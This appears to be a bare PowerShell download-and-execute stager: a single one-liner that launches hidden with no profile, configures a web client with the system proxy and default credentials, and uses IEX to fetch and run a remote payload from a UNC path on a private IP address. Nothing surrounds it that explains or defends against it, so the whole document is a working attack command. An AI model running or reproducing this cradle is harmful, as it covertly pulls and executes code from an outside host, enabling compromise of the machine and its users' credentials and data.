powershell.exe -nop -w hidden -c $l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring('\\192.168.128.128\RsmIl\test.dll');